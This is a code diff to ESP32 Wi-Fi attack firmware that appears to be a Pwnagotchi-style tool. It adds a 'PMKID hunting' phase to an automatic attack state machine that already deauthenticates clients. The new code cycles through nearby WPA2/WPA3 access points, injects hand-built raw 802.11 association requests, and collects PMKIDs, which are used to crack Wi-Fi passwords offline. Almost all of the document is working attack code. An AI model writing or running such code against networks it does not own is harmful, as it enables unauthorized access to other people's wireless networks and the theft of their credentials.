@@ -150,6 +150,7 @@ static const int RANDOM_SNIFF_CHANCE = 8;  // 8% chance per second = ~12 sec ave
 // Auto-attack state machine (like M5Gotchi)
 enum class AutoState {
     SCANNING,       // Scanning for networks
+    PMKID_HUNTING,  // Active PMKID probing phase
     LOCKING,        // Locked to target channel, discovering clients
     ATTACKING,      // Deauthing + sniffing target
     WAITING,        // Delay between attacks
@@ -165,6 +166,12 @@ static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
 static const uint32_t WAIT_TIME = 4500;         // 4.5 sec between targets (allows late EAPOL M3/M4)
 static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
 static const uint32_t BORED_THRESHOLD = 3;      // Failed target attempts before bored
+
+// PMKID hunting variables
+static int pmkidTargetIndex = 0;
+static uint32_t pmkidProbeTime = 0;
+static const uint32_t PMKID_TIMEOUT = 300;      // 300ms wait per AP
+static const uint32_t PMKID_HUNT_MAX = 30000;   // 30s total hunt window
 
 // Bored state tracking
 static uint8_t consecutiveFailedScans = 0;      // Track failed getNextTarget() calls
@@ -572,12 +579,15 @@ void OinkMode::update() {
                     lastMoodUpdate = now;
                 }
                 
-                // After scan time, sort and pick target
+                // After scan time, sort and enter PMKID hunting
                 if (now - stateStartTime > SCAN_TIME) {
                     if (!networks.empty()) {
                         sortNetworksByPriority();
-                        autoState = AutoState::NEXT_TARGET;
-                        Serial.println("[OINK] Scan complete, starting auto-attack");
+                        autoState = AutoState::PMKID_HUNTING;
+                        pmkidTargetIndex = -1;
+                        stateStartTime = now;
+                        Serial.println("[OINK] Scan complete, entering PMKID hunt mode");
+                        Mood::setStatusMessage("ghost farming");
                     } else {
                         // No networks found after scan time
                         consecutiveFailedScans++;
@@ -595,6 +605,73 @@ void OinkMode::update() {
                                          consecutiveFailedScans, BORED_THRESHOLD);
                         }
                     }
+                }
+            }
+            break;
+            
+        case AutoState::PMKID_HUNTING:
+            {
+                uint32_t huntElapsed = now - stateStartTime;
+                
+                // Timeout: 30s hunt window
+                if (huntElapsed > PMKID_HUNT_MAX) {
+                    Serial.printf("[OINK] PMKID hunt complete: %d PMKIDs captured\n", pmkids.size());
+                    autoState = AutoState::NEXT_TARGET;
+                    stateStartTime = now;
+                    Mood::setStatusMessage("weapons hot");
+                    break;
+                }
+                
+                // Find next WPA2/WPA3 AP without PMKID
+                bool foundTarget = false;
+                for (int attempts = 0; attempts < (int)networks.size() && !foundTarget; attempts++) {
+                    pmkidTargetIndex = (pmkidTargetIndex + 1) % networks.size();
+                    DetectedNetwork& net = networks[pmkidTargetIndex];
+                    
+                    // Skip: Open, WEP, BOAR BRO, PMF, or already have PMKID
+                    if (net.authmode == WIFI_AUTH_OPEN) continue;
+                    if (net.authmode == WIFI_AUTH_WEP) continue;
+                    if (isExcluded(net.bssid)) continue;
+                    if (net.hasPMF) continue;
+                    
+                    // Check if we already have PMKID for this AP
+                    bool hasPMKID = false;
+                    for (const auto& p : pmkids) {
+                        if (memcmp(p.bssid, net.bssid, 6) == 0) {
+                            hasPMKID = true;
+                            break;
+                        }
+                    }
+                    if (hasPMKID) continue;
+                    
+                    // Valid target found
+                    foundTarget = true;
+                    
+                    // Set channel
+                    if (currentChannel != net.channel) {
+                        setChannel(net.channel);
+                    }
+                    
+                    // Send association request
+                    sendAssociationRequest(net.bssid, net.ssid, strlen(net.ssid));
+                    pmkidProbeTime = now;
+                    Avatar::sniff();
+                }
+                
+                // Wait for M1 response with PMKID
+                if (foundTarget) {
+                    uint32_t waitTime = now - pmkidProbeTime;
+                    if (waitTime < PMKID_TIMEOUT) {
+                        // Still waiting for response
+                        break;
+                    }
+                    // Timeout for this AP, try next one (will cycle in next update)
+                } else {
+                    // No more targets to probe
+                    Serial.printf("[OINK] PMKID hunt complete: %d PMKIDs captured\n", pmkids.size());
+                    autoState = AutoState::NEXT_TARGET;
+                    stateStartTime = now;
+                    Mood::setStatusMessage("weapons hot");
                 }
             }
             break;
@@ -2188,6 +2265,66 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     disassocPacket[24] = reason;
     
     esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
+}
+
+void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
+    // 802.11 Association Request for active PMKID extraction
+    uint8_t assocReq[128];
+    memset(assocReq, 0, sizeof(assocReq));
+    
+    // Frame Control: Type=Management(0), Subtype=Association Request(0)
+    assocReq[0] = 0x00;
+    assocReq[1] = 0x00;
+    
+    // Duration
+    assocReq[2] = 0x00;
+    assocReq[3] = 0x00;
+    
+    // Address 1: Destination (AP BSSID)
+    memcpy(assocReq + 4, bssid, 6);
+    
+    // Address 2: Source (our MAC)
+    uint8_t ourMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
+    memcpy(assocReq + 10, ourMac, 6);
+    
+    // Address 3: BSSID
+    memcpy(assocReq + 16, bssid, 6);
+    
+    // Sequence control
+    assocReq[22] = 0x00;
+    assocReq[23] = 0x00;
+    
+    // Frame body starts at offset 24
+    uint16_t bodyOffset = 24;
+    
+    // Capability Info: ESS + Short Preamble
+    assocReq[bodyOffset++] = 0x01;
+    assocReq[bodyOffset++] = 0x04;
+    
+    // Listen Interval
+    assocReq[bodyOffset++] = 0x0A;
+    assocReq[bodyOffset++] = 0x00;
+    
+    // SSID IE (Tag 0)
+    assocReq[bodyOffset++] = 0x00;
+    assocReq[bodyOffset++] = ssidLen;
+    memcpy(assocReq + bodyOffset, ssid, ssidLen);
+    bodyOffset += ssidLen;
+    
+    // Supported Rates IE (Tag 1)
+    assocReq[bodyOffset++] = 0x01;
+    assocReq[bodyOffset++] = 0x08;
+    assocReq[bodyOffset++] = 0x82;  // 1 Mbps basic
+    assocReq[bodyOffset++] = 0x84;  // 2 Mbps basic
+    assocReq[bodyOffset++] = 0x8B;  // 5.5 Mbps basic
+    assocReq[bodyOffset++] = 0x96;  // 11 Mbps basic
+    assocReq[bodyOffset++] = 0x0C;  // 6 Mbps
+    assocReq[bodyOffset++] = 0x12;  // 9 Mbps
+    assocReq[bodyOffset++] = 0x18;  // 12 Mbps
+    assocReq[bodyOffset++] = 0x24;  // 18 Mbps
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
 }
 
 void OinkMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
